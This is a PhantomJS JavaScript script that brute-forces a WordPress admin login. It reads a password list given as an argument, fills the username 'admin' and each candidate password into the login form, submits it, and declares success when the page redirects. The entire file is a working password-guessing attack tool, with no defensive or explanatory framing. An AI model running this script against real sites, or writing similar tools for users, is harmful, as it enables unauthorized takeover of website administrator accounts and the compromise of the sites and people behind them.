var system = require('system');
var page = require('webpage').create();

var url = 'login/wordpress/url';
var passListPath = system.args[1];
var passArray = [];
var passArrIndex = 0;

main();

function main() {
	readPassFile(passListPath);
	initPage();
}

function initPage() {
	page.onLoadFinished = pageLoaded;
	page.open(url);
}

function pageLoaded() {
	var currentUrl = page.evaluate(getUrl);
	
	if (currentUrl == url) {
		console.log("Trying pass : " + passArray[passArrIndex]);
		page.evaluate(tryPass, passArray[passArrIndex]);
		passIndexSet();
	}else{
		console.log("<><><><><><><><><><><><>");
		console.log("Pass Cracked successfully!.");
		console.log("Pass : " + passArray[passArrIndex - 1]);
		console.log("<><><><><><><><><><><><>");
		phantom.exit();
	}

	console.log('URL : ' + currentUrl);
}

function getUrl() {
	return window.location.href;
}

function tryPass(password){
	//filling usr input
	var usrInput = document.querySelector('#user_login');
	usrInput.value = 'admin';
	//filling pass input
	var passInput = document.querySelector('#user_pass');
	passInput.value = password;
	//clicking login button
	var wpButton = document.querySelector('#wp-submit');
	wpButton.click();
}

function readPassFile(fileDir) {
	var fs = require('fs');
	var content = fs.read(fileDir);
	
	passArray = content.split('\n');
}

function passIndexSet() {
	passArrIndex++;

	if(passArrIndex >= passArray.length){
		console.log("@@@@@@@@@@@@@@@@@@@@");
		console.log("Carcking failed!.");
		phantom.exit();
	}
}